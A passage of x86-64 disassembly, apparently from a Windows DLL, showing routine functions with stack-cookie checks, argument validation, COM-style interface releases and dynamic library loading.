   180001e9a:	4a 8b 6c 3f 40       	mov    0x40(%rdi,%r15,1),%rbp
   180001e9f:	90                   	nop
   180001ea0:	49 63 c1             	movslq %r9d,%rax
   180001ea3:	4c 8d 85 00 01 00 00 	lea    0x100(%rbp),%r8
   180001eaa:	4c 69 d0 d0 01 00 00 	imul   $0x1d0,%rax,%r10
   180001eb1:	49 8b c6             	mov    %r14,%rax
   180001eb4:	4d 03 c2             	add    %r10,%r8
   180001eb7:	4d 2b c6             	sub    %r14,%r8
   180001eba:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   180001ec0:	0f b6 10             	movzbl (%rax),%edx
   180001ec3:	42 0f b6 0c 00       	movzbl (%rax,%r8,1),%ecx
   180001ec8:	2b d1                	sub    %ecx,%edx
   180001eca:	75 07                	jne    0x180001ed3
   180001ecc:	48 ff c0             	inc    %rax
   180001ecf:	85 c9                	test   %ecx,%ecx
   180001ed1:	75 ed                	jne    0x180001ec0
   180001ed3:	85 d2                	test   %edx,%edx
   180001ed5:	74 1a                	je     0x180001ef1
   180001ed7:	41 ff c1             	inc    %r9d
   180001eda:	45 3b cb             	cmp    %r11d,%r9d
   180001edd:	7c c1                	jl     0x180001ea0
   180001edf:	48 ff c3             	inc    %rbx
   180001ee2:	48 83 c7 68          	add    $0x68,%rdi
   180001ee6:	48 83 c6 68          	add    $0x68,%rsi
   180001eea:	49 3b dc             	cmp    %r12,%rbx
   180001eed:	7c 98                	jl     0x180001e87
   180001eef:	eb 09                	jmp    0x180001efa
   180001ef1:	41 83 8c 2a 20 01 00 	orl    $0x1,0x120(%r10,%rbp,1)
   180001ef8:	00 01 
   180001efa:	4c 8b 64 24 08       	mov    0x8(%rsp),%r12
   180001eff:	48 8b 7c 24 38       	mov    0x38(%rsp),%rdi
   180001f04:	48 8b 74 24 30       	mov    0x30(%rsp),%rsi
   180001f09:	48 8b 6c 24 28       	mov    0x28(%rsp),%rbp
   180001f0e:	48 8b 5c 24 20       	mov    0x20(%rsp),%rbx
   180001f13:	4c 8b 3c 24          	mov    (%rsp),%r15
   180001f17:	48 83 c4 10          	add    $0x10,%rsp
   180001f1b:	41 5e                	pop    %r14
   180001f1d:	c3                   	ret
   180001f1e:	cc                   	int3
   180001f1f:	cc                   	int3
   180001f20:	4c 8b dc             	mov    %rsp,%r11
   180001f23:	53                   	push   %rbx
   180001f24:	55                   	push   %rbp
   180001f25:	57                   	push   %rdi
   180001f26:	48 81 ec b0 00 00 00 	sub    $0xb0,%rsp
   180001f2d:	48 8b 05 cc 70 01 00 	mov    0x170cc(%rip),%rax        # 0x180019000
   180001f34:	48 33 c4             	xor    %rsp,%rax
   180001f37:	48 89 84 24 90 00 00 	mov    %rax,0x90(%rsp)
   180001f3e:	00 
   180001f3f:	49 8b f9             	mov    %r9,%rdi
   180001f42:	49 63 e8             	movslq %r8d,%rbp
   180001f45:	48 8b d9             	mov    %rcx,%rbx
   180001f48:	48 85 c9             	test   %rcx,%rcx
   180001f4b:	0f 84 7f 01 00 00    	je     0x1800020d0
   180001f51:	48 83 79 08 00       	cmpq   $0x0,0x8(%rcx)
   180001f56:	0f 84 74 01 00 00    	je     0x1800020d0
   180001f5c:	4d 85 c9             	test   %r9,%r9
   180001f5f:	0f 84 6b 01 00 00    	je     0x1800020d0
   180001f65:	85 d2                	test   %edx,%edx
   180001f67:	0f 88 63 01 00 00    	js     0x1800020d0
   180001f6d:	3b 91 68 03 00 00    	cmp    0x368(%rcx),%edx
   180001f73:	0f 8d 57 01 00 00    	jge    0x1800020d0
   180001f79:	49 89 73 e0          	mov    %rsi,-0x20(%r11)
   180001f7d:	48 63 c2             	movslq %edx,%rax
   180001f80:	48 6b f0 68          	imul   $0x68,%rax,%rsi
   180001f84:	48 03 b1 60 03 00 00 	add    0x360(%rcx),%rsi
   180001f8b:	45 85 c0             	test   %r8d,%r8d
   180001f8e:	0f 88 32 01 00 00    	js     0x1800020c6
   180001f94:	3b 6e 38             	cmp    0x38(%rsi),%ebp
   180001f97:	0f 8d 29 01 00 00    	jge    0x1800020c6
   180001f9d:	4d 89 73 d8          	mov    %r14,-0x28(%r11)
   180001fa1:	4c 8b b1 a8 00 00 00 	mov    0xa8(%rcx),%r14
   180001fa8:	4d 85 f6             	test   %r14,%r14
   180001fab:	75 2f                	jne    0x180001fdc
   180001fad:	41 8d 46 05          	lea    0x5(%r14),%eax
   180001fb1:	4c 8b b4 24 a0 00 00 	mov    0xa0(%rsp),%r14
   180001fb8:	00 
   180001fb9:	48 8b b4 24 a8 00 00 	mov    0xa8(%rsp),%rsi
   180001fc0:	00 
   180001fc1:	48 8b 8c 24 90 00 00 	mov    0x90(%rsp),%rcx
   180001fc8:	00 
   180001fc9:	48 33 cc             	xor    %rsp,%rcx
   180001fcc:	e8 5f 32 00 00       	call   0x180005230
   180001fd1:	48 81 c4 b0 00 00 00 	add    $0xb0,%rsp
   180001fd8:	5f                   	pop    %rdi
   180001fd9:	5d                   	pop    %rbp
   180001fda:	5b                   	pop    %rbx
   180001fdb:	c3                   	ret
   180001fdc:	33 d2                	xor    %edx,%edx
   180001fde:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   180001fe3:	44 8d 42 70          	lea    0x70(%rdx),%r8d
   180001fe7:	e8 74 32 00 00       	call   0x180005260
   180001fec:	8b 0f                	mov    (%rdi),%ecx
   180001fee:	85 c9                	test   %ecx,%ecx
   180001ff0:	74 49                	je     0x18000203b
   180001ff2:	ff c9                	dec    %ecx
   180001ff4:	74 33                	je     0x180002029
   180001ff6:	ff c9                	dec    %ecx
   180001ff8:	74 1d                	je     0x180002017
   180001ffa:	ff c9                	dec    %ecx
   180001ffc:	74 07                	je     0x180002005
   180001ffe:	b8 02 00 00 00       	mov    $0x2,%eax
   180002003:	eb ac                	jmp    0x180001fb1
   180002005:	c7 44 24 24 40 00 00 	movl   $0x40,0x24(%rsp)
   18000200c:	00 
   18000200d:	c7 44 24 28 00 02 00 	movl   $0x200,0x28(%rsp)
   180002014:	00 
   180002015:	eb 34                	jmp    0x18000204b
   180002017:	c7 44 24 24 04 00 00 	movl   $0x4,0x24(%rsp)
   18000201e:	00 
   18000201f:	c7 44 24 28 08 00 00 	movl   $0x8,0x28(%rsp)
   180002026:	00 
   180002027:	eb 22                	jmp    0x18000204b
   180002029:	c7 44 24 24 20 00 00 	movl   $0x20,0x24(%rsp)
   180002030:	00 
   180002031:	c7 44 24 28 40 00 00 	movl   $0x40,0x28(%rsp)
   180002038:	00 
   180002039:	eb 10                	jmp    0x18000204b
   18000203b:	c7 44 24 24 01 00 00 	movl   $0x1,0x24(%rsp)
   180002042:	00 
   180002043:	c7 44 24 28 01 00 00 	movl   $0x1,0x28(%rsp)
   18000204a:	00 
   18000204b:	0f 10 47 08          	movups 0x8(%rdi),%xmm0
   18000204f:	4c 8b 93 70 03 00 00 	mov    0x370(%rbx),%r10
   180002056:	48 8b 4b 08          	mov    0x8(%rbx),%rcx
   18000205a:	4c 69 c5 d0 01 00 00 	imul   $0x1d0,%rbp,%r8
   180002061:	4c 8d 4c 24 20       	lea    0x20(%rsp),%r9
   180002066:	0f 29 44 24 50       	movaps %xmm0,0x50(%rsp)
   18000206b:	0f 10 47 18          	movups 0x18(%rdi),%xmm0
   18000206f:	0f 29 44 24 30       	movaps %xmm0,0x30(%rsp)
   180002074:	0f 10 47 28          	movups 0x28(%rdi),%xmm0
   180002078:	0f 29 44 24 40       	movaps %xmm0,0x40(%rsp)
   18000207d:	0f 10 47 38          	movups 0x38(%rdi),%xmm0
   180002081:	0f 29 44 24 60       	movaps %xmm0,0x60(%rsp)
   180002086:	0f 10 47 48          	movups 0x48(%rdi),%xmm0
   18000208a:	0f 29 44 24 70       	movaps %xmm0,0x70(%rsp)
   18000208f:	0f 10 47 58          	movups 0x58(%rdi),%xmm0
   180002093:	0f 29 84 24 80 00 00 	movaps %xmm0,0x80(%rsp)
   18000209a:	00 
   18000209b:	48 63 46 60          	movslq 0x60(%rsi),%rax
   18000209f:	4c 8b 5e 40          	mov    0x40(%rsi),%r11
   1800020a3:	47 8b 84 18 c8 01 00 	mov    0x1c8(%r8,%r11,1),%r8d
   1800020aa:	00 
   1800020ab:	48 69 d0 24 06 00 00 	imul   $0x624,%rax,%rdx
   1800020b2:	42 8b 54 12 04       	mov    0x4(%rdx,%r10,1),%edx
   1800020b7:	41 ff d6             	call   *%r14
   1800020ba:	f7 d8                	neg    %eax
   1800020bc:	1b c0                	sbb    %eax,%eax
   1800020be:	83 e0 07             	and    $0x7,%eax
   1800020c1:	e9 eb fe ff ff       	jmp    0x180001fb1
   1800020c6:	b8 02 00 00 00       	mov    $0x2,%eax
   1800020cb:	e9 e9 fe ff ff       	jmp    0x180001fb9
   1800020d0:	b8 02 00 00 00       	mov    $0x2,%eax
   1800020d5:	e9 e7 fe ff ff       	jmp    0x180001fc1
   1800020da:	cc                   	int3
   1800020db:	cc                   	int3
   1800020dc:	cc                   	int3
   1800020dd:	cc                   	int3
   1800020de:	cc                   	int3
   1800020df:	cc                   	int3
   1800020e0:	40 53                	rex push %rbx
   1800020e2:	48 83 ec 20          	sub    $0x20,%rsp
   1800020e6:	33 c0                	xor    %eax,%eax
   1800020e8:	48 8b da             	mov    %rdx,%rbx
   1800020eb:	48 85 c9             	test   %rcx,%rcx
   1800020ee:	74 0a                	je     0x1800020fa
   1800020f0:	e8 2b 00 00 00       	call   0x180002120
   1800020f5:	48 85 c0             	test   %rax,%rax
   1800020f8:	75 12                	jne    0x18000210c
   1800020fa:	48 85 db             	test   %rbx,%rbx
   1800020fd:	74 0d                	je     0x18000210c
   1800020ff:	48 8b cb             	mov    %rbx,%rcx
   180002102:	48 83 c4 20          	add    $0x20,%rsp
   180002106:	5b                   	pop    %rbx
   180002107:	e9 14 00 00 00       	jmp    0x180002120
   18000210c:	48 83 c4 20          	add    $0x20,%rsp
   180002110:	5b                   	pop    %rbx
   180002111:	c3                   	ret
   180002112:	cc                   	int3
   180002113:	cc                   	int3
   180002114:	cc                   	int3
   180002115:	cc                   	int3
   180002116:	cc                   	int3
   180002117:	cc                   	int3
   180002118:	cc                   	int3
   180002119:	cc                   	int3
   18000211a:	cc                   	int3
   18000211b:	cc                   	int3
   18000211c:	cc                   	int3
   18000211d:	cc                   	int3
   18000211e:	cc                   	int3
   18000211f:	cc                   	int3
   180002120:	48 81 ec 38 04 00 00 	sub    $0x438,%rsp
   180002127:	48 8b 05 d2 6e 01 00 	mov    0x16ed2(%rip),%rax        # 0x180019000
   18000212e:	48 33 c4             	xor    %rsp,%rax
   180002131:	48 89 84 24 20 04 00 	mov    %rax,0x420(%rsp)
   180002138:	00 
   180002139:	ff 15 f1 ee 00 00    	call   *0xeef1(%rip)        # 0x180011030
   18000213f:	48 85 c0             	test   %rax,%rax
   180002142:	74 37                	je     0x18000217b
   180002144:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   180002149:	41 b8 00 04 00 00    	mov    $0x400,%r8d
   18000214f:	48 8b c8             	mov    %rax,%rcx
   180002152:	ff 15 d0 ee 00 00    	call   *0xeed0(%rip)        # 0x180011028
   180002158:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   18000215d:	ff 15 05 ef 00 00    	call   *0xef05(%rip)        # 0x180011068
   180002163:	48 8b 8c 24 20 04 00 	mov    0x420(%rsp),%rcx
   18000216a:	00 
   18000216b:	48 33 cc             	xor    %rsp,%rcx
   18000216e:	e8 bd 30 00 00       	call   0x180005230
   180002173:	48 81 c4 38 04 00 00 	add    $0x438,%rsp
   18000217a:	c3                   	ret
   18000217b:	48 8b 8c 24 20 04 00 	mov    0x420(%rsp),%rcx
   180002182:	00 
   180002183:	48 33 cc             	xor    %rsp,%rcx
   180002186:	e8 a5 30 00 00       	call   0x180005230
   18000218b:	48 81 c4 38 04 00 00 	add    $0x438,%rsp
   180002192:	c3                   	ret
   180002193:	cc                   	int3
   180002194:	cc                   	int3
   180002195:	cc                   	int3
   180002196:	cc                   	int3
   180002197:	cc                   	int3
   180002198:	cc                   	int3
   180002199:	cc                   	int3
   18000219a:	cc                   	int3
   18000219b:	cc                   	int3
   18000219c:	cc                   	int3
   18000219d:	cc                   	int3
   18000219e:	cc                   	int3
   18000219f:	cc                   	int3
   1800021a0:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   1800021a5:	57                   	push   %rdi
   1800021a6:	48 81 ec 30 04 00 00 	sub    $0x430,%rsp
   1800021ad:	48 8b 05 4c 6e 01 00 	mov    0x16e4c(%rip),%rax        # 0x180019000
   1800021b4:	48 33 c4             	xor    %rsp,%rax
   1800021b7:	48 89 84 24 20 04 00 	mov    %rax,0x420(%rsp)
   1800021be:	00 
   1800021bf:	48 8b 79 78          	mov    0x78(%rcx),%rdi
   1800021c3:	48 8b d9             	mov    %rcx,%rbx
   1800021c6:	48 85 ff             	test   %rdi,%rdi
   1800021c9:	74 5e                	je     0x180002229
   1800021cb:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   1800021d0:	33 d2                	xor    %edx,%edx
   1800021d2:	41 b8 00 01 00 00    	mov    $0x100,%r8d
   1800021d8:	e8 83 30 00 00       	call   0x180005260
   1800021dd:	48 8d 8c 24 20 01 00 	lea    0x120(%rsp),%rcx
   1800021e4:	00 
   1800021e5:	33 d2                	xor    %edx,%edx
   1800021e7:	41 b8 00 03 00 00    	mov    $0x300,%r8d
   1800021ed:	e8 6e 30 00 00       	call   0x180005260
   1800021f2:	48 8b 4b 08          	mov    0x8(%rbx),%rcx
   1800021f6:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   1800021fb:	ff d7                	call   *%rdi
   1800021fd:	83 f8 01             	cmp    $0x1,%eax
   180002200:	77 7d                	ja     0x18000227f
   180002202:	48 8d 8b 60 01 00 00 	lea    0x160(%rbx),%rcx
   180002209:	4c 8d 44 24 20       	lea    0x20(%rsp),%r8
   18000220e:	ba 00 01 00 00       	mov    $0x100,%edx
   180002213:	e8 04 33 00 00       	call   0x18000551c
   180002218:	48 8d 8b 60 02 00 00 	lea    0x260(%rbx),%rcx
   18000221f:	4c 8d 84 24 20 02 00 	lea    0x220(%rsp),%r8
   180002226:	00 
   180002227:	eb 4c                	jmp    0x180002275
   180002229:	48 8b 79 70          	mov    0x70(%rcx),%rdi
   18000222d:	48 85 ff             	test   %rdi,%rdi
   180002230:	74 4d                	je     0x18000227f
   180002232:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   180002237:	33 d2                	xor    %edx,%edx
   180002239:	41 b8 00 01 00 00    	mov    $0x100,%r8d
   18000223f:	e8 1c 30 00 00       	call   0x180005260
   180002244:	48 8d 8c 24 20 01 00 	lea    0x120(%rsp),%rcx
   18000224b:	00 
   18000224c:	33 d2                	xor    %edx,%edx
   18000224e:	41 b8 00 02 00 00    	mov    $0x200,%r8d
   180002254:	e8 07 30 00 00       	call   0x180005260
   180002259:	48 8b 4b 08          	mov    0x8(%rbx),%rcx
   18000225d:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   180002262:	ff d7                	call   *%rdi
   180002264:	83 f8 01             	cmp    $0x1,%eax
   180002267:	77 16                	ja     0x18000227f
   180002269:	48 8d 8b 60 01 00 00 	lea    0x160(%rbx),%rcx
   180002270:	4c 8d 44 24 20       	lea    0x20(%rsp),%r8
   180002275:	ba 00 01 00 00       	mov    $0x100,%edx
   18000227a:	e8 9d 32 00 00       	call   0x18000551c
   18000227f:	48 8b 8c 24 20 04 00 	mov    0x420(%rsp),%rcx
   180002286:	00 
   180002287:	48 33 cc             	xor    %rsp,%rcx
   18000228a:	e8 a1 2f 00 00       	call   0x180005230
   18000228f:	48 8b 9c 24 48 04 00 	mov    0x448(%rsp),%rbx
   180002296:	00 
   180002297:	48 81 c4 30 04 00 00 	add    $0x430,%rsp
   18000229e:	5f                   	pop    %rdi
   18000229f:	c3                   	ret
   1800022a0:	40 53                	rex push %rbx
   1800022a2:	48 83 ec 20          	sub    $0x20,%rsp
   1800022a6:	33 c0                	xor    %eax,%eax
   1800022a8:	48 8b da             	mov    %rdx,%rbx
   1800022ab:	48 85 c9             	test   %rcx,%rcx
   1800022ae:	74 0b                	je     0x1800022bb
   1800022b0:	ff 15 b2 ed 00 00    	call   *0xedb2(%rip)        # 0x180011068
   1800022b6:	48 85 c0             	test   %rax,%rax
   1800022b9:	75 14                	jne    0x1800022cf
   1800022bb:	48 85 db             	test   %rbx,%rbx
   1800022be:	74 0f                	je     0x1800022cf
   1800022c0:	48 8b cb             	mov    %rbx,%rcx
   1800022c3:	48 83 c4 20          	add    $0x20,%rsp
   1800022c7:	5b                   	pop    %rbx
   1800022c8:	48 ff 25 99 ed 00 00 	rex.W jmp *0xed99(%rip)        # 0x180011068
   1800022cf:	48 83 c4 20          	add    $0x20,%rsp
   1800022d3:	5b                   	pop    %rbx
   1800022d4:	c3                   	ret
   1800022d5:	cc                   	int3
   1800022d6:	cc                   	int3
   1800022d7:	cc                   	int3
   1800022d8:	cc                   	int3
   1800022d9:	cc                   	int3
   1800022da:	cc                   	int3
   1800022db:	cc                   	int3
   1800022dc:	cc                   	int3
   1800022dd:	cc                   	int3
   1800022de:	cc                   	int3
   1800022df:	cc                   	int3
   1800022e0:	48 83 ec 28          	sub    $0x28,%rsp
   1800022e4:	48 85 c9             	test   %rcx,%rcx
   1800022e7:	75 08                	jne    0x1800022f1
   1800022e9:	8d 41 02             	lea    0x2(%rcx),%eax
   1800022ec:	48 83 c4 28          	add    $0x28,%rsp
   1800022f0:	c3                   	ret
   1800022f1:	48 8b 89 f0 00 00 00 	mov    0xf0(%rcx),%rcx
   1800022f8:	48 85 c9             	test   %rcx,%rcx
   1800022fb:	75 08                	jne    0x180002305
   1800022fd:	8d 41 06             	lea    0x6(%rcx),%eax
   180002300:	48 83 c4 28          	add    $0x28,%rsp
   180002304:	c3                   	ret
   180002305:	48 8b 01             	mov    (%rcx),%rax
   180002308:	ff 50 18             	call   *0x18(%rax)
   18000230b:	33 c9                	xor    %ecx,%ecx
   18000230d:	85 c0                	test   %eax,%eax
   18000230f:	0f 95 c1             	setne  %cl
   180002312:	8b c1                	mov    %ecx,%eax
   180002314:	48 83 c4 28          	add    $0x28,%rsp
   180002318:	c3                   	ret
   180002319:	cc                   	int3
   18000231a:	cc                   	int3
   18000231b:	cc                   	int3
   18000231c:	cc                   	int3
   18000231d:	cc                   	int3
   18000231e:	cc                   	int3
   18000231f:	cc                   	int3
   180002320:	40 53                	rex push %rbx
   180002322:	48 83 ec 20          	sub    $0x20,%rsp
   180002326:	48 8b d9             	mov    %rcx,%rbx
   180002329:	48 85 c9             	test   %rcx,%rcx
   18000232c:	75 09                	jne    0x180002337
   18000232e:	8d 41 02             	lea    0x2(%rcx),%eax
   180002331:	48 83 c4 20          	add    $0x20,%rsp
   180002335:	5b                   	pop    %rbx
   180002336:	c3                   	ret
   180002337:	48 8b 89 f0 00 00 00 	mov    0xf0(%rcx),%rcx
   18000233e:	48 89 7c 24 30       	mov    %rdi,0x30(%rsp)
   180002343:	33 ff                	xor    %edi,%edi
   180002345:	48 85 c9             	test   %rcx,%rcx
   180002348:	74 0d                	je     0x180002357
   18000234a:	48 8b 01             	mov    (%rcx),%rax
   18000234d:	ff 50 08             	call   *0x8(%rax)
   180002350:	48 89 bb f0 00 00 00 	mov    %rdi,0xf0(%rbx)
   180002357:	48 8b 8b f8 00 00 00 	mov    0xf8(%rbx),%rcx
   18000235e:	48 85 c9             	test   %rcx,%rcx
   180002361:	74 0d                	je     0x180002370
   180002363:	48 8b 01             	mov    (%rcx),%rax
   180002366:	ff 50 08             	call   *0x8(%rax)
   180002369:	48 89 bb f8 00 00 00 	mov    %rdi,0xf8(%rbx)
   180002370:	48 8b 8b 00 01 00 00 	mov    0x100(%rbx),%rcx
   180002377:	48 85 c9             	test   %rcx,%rcx
   18000237a:	74 0d                	je     0x180002389
   18000237c:	48 8b 01             	mov    (%rcx),%rax
   18000237f:	ff 50 08             	call   *0x8(%rax)
   180002382:	48 89 bb 00 01 00 00 	mov    %rdi,0x100(%rbx)
   180002389:	48 8b 8b 08 01 00 00 	mov    0x108(%rbx),%rcx
   180002390:	48 85 c9             	test   %rcx,%rcx
   180002393:	74 0d                	je     0x1800023a2
   180002395:	48 8b 01             	mov    (%rcx),%rax
   180002398:	ff 50 08             	call   *0x8(%rax)
   18000239b:	48 89 bb 08 01 00 00 	mov    %rdi,0x108(%rbx)
   1800023a2:	48 8b 8b 18 01 00 00 	mov    0x118(%rbx),%rcx
   1800023a9:	48 85 c9             	test   %rcx,%rcx
   1800023ac:	74 0d                	je     0x1800023bb
   1800023ae:	48 8b 01             	mov    (%rcx),%rax
   1800023b1:	ff 50 08             	call   *0x8(%rax)
   1800023b4:	48 89 bb 18 01 00 00 	mov    %rdi,0x118(%rbx)
   1800023bb:	48 8b 8b 20 01 00 00 	mov    0x120(%rbx),%rcx
   1800023c2:	48 85 c9             	test   %rcx,%rcx
   1800023c5:	74 0d                	je     0x1800023d4
   1800023c7:	48 8b 01             	mov    (%rcx),%rax
   1800023ca:	ff 50 08             	call   *0x8(%rax)
   1800023cd:	48 89 bb 20 01 00 00 	mov    %rdi,0x120(%rbx)
   1800023d4:	48 8b 8b 28 01 00 00 	mov    0x128(%rbx),%rcx
   1800023db:	48 85 c9             	test   %rcx,%rcx
   1800023de:	74 0d                	je     0x1800023ed
   1800023e0:	48 8b 01             	mov    (%rcx),%rax
   1800023e3:	ff 50 08             	call   *0x8(%rax)
   1800023e6:	48 89 bb 28 01 00 00 	mov    %rdi,0x128(%rbx)
   1800023ed:	48 8b 8b e8 00 00 00 	mov    0xe8(%rbx),%rcx
   1800023f4:	48 85 c9             	test   %rcx,%rcx
   1800023f7:	74 0d                	je     0x180002406
   1800023f9:	48 8b 01             	mov    (%rcx),%rax
   1800023fc:	ff 50 08             	call   *0x8(%rax)
   1800023ff:	48 89 bb e8 00 00 00 	mov    %rdi,0xe8(%rbx)
   180002406:	48 8b 8b d0 00 00 00 	mov    0xd0(%rbx),%rcx
   18000240d:	48 85 c9             	test   %rcx,%rcx
   180002410:	74 0d                	je     0x18000241f
   180002412:	ff 15 48 ec 00 00    	call   *0xec48(%rip)        # 0x180011060
   180002418:	48 89 bb d0 00 00 00 	mov    %rdi,0xd0(%rbx)
   18000241f:	48 89 bb d8 00 00 00 	mov    %rdi,0xd8(%rbx)
   180002426:	48 8b 7c 24 30       	mov    0x30(%rsp),%rdi
   18000242b:	33 c0                	xor    %eax,%eax
   18000242d:	48 83 c4 20          	add    $0x20,%rsp
   180002431:	5b                   	pop    %rbx
   180002432:	c3                   	ret
   180002433:	cc                   	int3
   180002434:	cc                   	int3
   180002435:	cc                   	int3
   180002436:	cc                   	int3
   180002437:	cc                   	int3
   180002438:	cc                   	int3
   180002439:	cc                   	int3
   18000243a:	cc                   	int3
   18000243b:	cc                   	int3
   18000243c:	cc                   	int3
   18000243d:	cc                   	int3
   18000243e:	cc                   	int3
   18000243f:	cc                   	int3
   180002440:	48 83 ec 28          	sub    $0x28,%rsp
   180002444:	48 85 c9             	test   %rcx,%rcx
   180002447:	75 08                	jne    0x180002451
   180002449:	8d 41 02             	lea    0x2(%rcx),%eax
   18000244c:	48 83 c4 28          	add    $0x28,%rsp
   180002450:	c3                   	ret
   180002451:	48 8b 89 f0 00 00 00 	mov    0xf0(%rcx),%rcx
   180002458:	48 85 c9             	test   %rcx,%rcx
   18000245b:	75 08                	jne    0x180002465
   18000245d:	8d 41 06             	lea    0x6(%rcx),%eax
   180002460:	48 83 c4 28          	add    $0x28,%rsp
   180002464:	c3                   	ret
   180002465:	48 8b 01             	mov    (%rcx),%rax
   180002468:	ff 50 20             	call   *0x20(%rax)
   18000246b:	33 c9                	xor    %ecx,%ecx
   18000246d:	85 c0                	test   %eax,%eax
   18000246f:	0f 95 c1             	setne  %cl
   180002472:	8b c1                	mov    %ecx,%eax
   180002474:	48 83 c4 28          	add    $0x28,%rsp
   180002478:	c3                   	ret
   180002479:	cc                   	int3
   18000247a:	cc                   	int3
   18000247b:	cc                   	int3
   18000247c:	cc                   	int3
   18000247d:	cc                   	int3
   18000247e:	cc                   	int3
   18000247f:	cc                   	int3
   180002480:	40 53                	rex push %rbx
   180002482:	48 83 ec 20          	sub    $0x20,%rsp
   180002486:	48 8b da             	mov    %rdx,%rbx
   180002489:	48 85 c9             	test   %rcx,%rcx
   18000248c:	74 33                	je     0x1800024c1
   18000248e:	48 85 d2             	test   %rdx,%rdx
   180002491:	74 2e                	je     0x1800024c1
   180002493:	f7 81 e0 00 00 00 00 	testl  $0x10000,0xe0(%rcx)
   18000249a:	00 01 00 
   18000249d:	75 0b                	jne    0x1800024aa
   18000249f:	b8 06 00 00 00       	mov    $0x6,%eax
   1800024a4:	48 83 c4 20          	add    $0x20,%rsp
   1800024a8:	5b                   	pop    %rbx
   1800024a9:	c3                   	ret
   1800024aa:	48 8b 89 28 01 00 00 	mov    0x128(%rcx),%rcx
   1800024b1:	48 8b 01             	mov    (%rcx),%rax
   1800024b4:	ff 50 28             	call   *0x28(%rax)
   1800024b7:	89 03                	mov    %eax,(%rbx)
   1800024b9:	33 c0                	xor    %eax,%eax
   1800024bb:	48 83 c4 20          	add    $0x20,%rsp
   1800024bf:	5b                   	pop    %rbx
   1800024c0:	c3                   	ret
   1800024c1:	b8 02 00 00 00       	mov    $0x2,%eax
   1800024c6:	48 83 c4 20          	add    $0x20,%rsp
   1800024ca:	5b                   	pop    %rbx
   1800024cb:	c3                   	ret
   1800024cc:	cc                   	int3
   1800024cd:	cc                   	int3
   1800024ce:	cc                   	int3
   1800024cf:	cc                   	int3
   1800024d0:	48 83 ec 28          	sub    $0x28,%rsp
   1800024d4:	48 85 c9             	test   %rcx,%rcx
   1800024d7:	74 45                	je     0x18000251e
   1800024d9:	48 83 b9 d8 00 00 00 	cmpq   $0x0,0xd8(%rcx)
   1800024e0:	00 
   1800024e1:	74 3b                	je     0x18000251e
   1800024e3:	4c 8b 81 e8 00 00 00 	mov    0xe8(%rcx),%r8
   1800024ea:	4d 85 c0             	test   %r8,%r8
   1800024ed:	75 0a                	jne    0x1800024f9
   1800024ef:	b8 06 00 00 00       	mov    $0x6,%eax
   1800024f4:	48 83 c4 28          	add    $0x28,%rsp
   1800024f8:	c3                   	ret
   1800024f9:	83 fa 09             	cmp    $0x9,%edx
   1800024fc:	75 09                	jne    0x180002507
   1800024fe:	f6 81 e0 00 00 00 02 	testb  $0x2,0xe0(%rcx)
   180002505:	74 e8                	je     0x1800024ef
   180002507:	49 8b 00             	mov    (%r8),%rax
   18000250a:	49 8b c8             	mov    %r8,%rcx
   18000250d:	ff 50 28             	call   *0x28(%rax)
   180002510:	33 c9                	xor    %ecx,%ecx
   180002512:	85 c0                	test   %eax,%eax
   180002514:	0f 95 c1             	setne  %cl
   180002517:	8b c1                	mov    %ecx,%eax
   180002519:	48 83 c4 28          	add    $0x28,%rsp
   18000251d:	c3                   	ret
   18000251e:	b8 02 00 00 00       	mov    $0x2,%eax
   180002523:	48 83 c4 28          	add    $0x28,%rsp
   180002527:	c3                   	ret
   180002528:	cc                   	int3
   180002529:	cc                   	int3
   18000252a:	cc                   	int3
   18000252b:	cc                   	int3
   18000252c:	cc                   	int3
   18000252d:	cc                   	int3
   18000252e:	cc                   	int3
   18000252f:	cc                   	int3
   180002530:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   180002535:	48 89 6c 24 20       	mov    %rbp,0x20(%rsp)
   18000253a:	57                   	push   %rdi
   18000253b:	48 83 ec 30          	sub    $0x30,%rsp
   18000253f:	49 8b d9             	mov    %r9,%rbx
   180002542:	41 8b e8             	mov    %r8d,%ebp
   180002545:	48 8b f9             	mov    %rcx,%rdi
   180002548:	48 85 c9             	test   %rcx,%rcx
   18000254b:	0f 84 b5 03 00 00    	je     0x180002906
   180002551:	48 85 d2             	test   %rdx,%rdx
   180002554:	0f 84 ac 03 00 00    	je     0x180002906
   18000255a:	48 85 db             	test   %rbx,%rbx
   18000255d:	0f 84 a3 03 00 00    	je     0x180002906
   180002563:	48 89 91 d8 00 00 00 	mov    %rdx,0xd8(%rcx)
   18000256a:	48 8d 15 ff ed 00 00 	lea    0xedff(%rip),%rdx        # 0x180011370
   180002571:	48 8d 0d 08 ee 00 00 	lea    0xee08(%rip),%rcx        # 0x180011380
   180002578:	41 c7 01 00 00 00 00 	movl   $0x0,(%r9)
   18000257f:	e8 5c fb ff ff       	call   0x1800020e0
   180002584:	48 89 87 d0 00 00 00 	mov    %rax,0xd0(%rdi)
   18000258b:	48 85 c0             	test   %rax,%rax
   18000258e:	75 15                	jne    0x1800025a5
   180002590:	b8 04 00 00 00       	mov    $0x4,%eax
   180002595:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   18000259a:	48 8b 6c 24 58       	mov    0x58(%rsp),%rbp
   18000259f:	48 83 c4 30          	add    $0x30,%rsp
   1800025a3:	5f                   	pop    %rdi
   1800025a4:	c3                   	ret
   1800025a5:	48 8d 15 e4 ed 00 00 	lea    0xede4(%rip),%rdx        # 0x180011390
   1800025ac:	48 8b c8             	mov    %rax,%rcx
   1800025af:	ff 15 a3 ea 00 00    	call   *0xeaa3(%rip)        # 0x180011058
   1800025b5:	48 85 c0             	test   %rax,%rax
   1800025b8:	0f 84 2e 03 00 00    	je     0x1800028ec
   1800025be:	48 8b 8f d8 00 00 00 	mov    0xd8(%rdi),%rcx
   1800025c5:	48 89 74 24 48       	mov    %rsi,0x48(%rsp)
   1800025ca:	48 8d b7 e8 00 00 00 	lea    0xe8(%rdi),%rsi
   1800025d1:	48 8b d6             	mov    %rsi,%rdx
   1800025d4:	ff d0                	call   *%rax
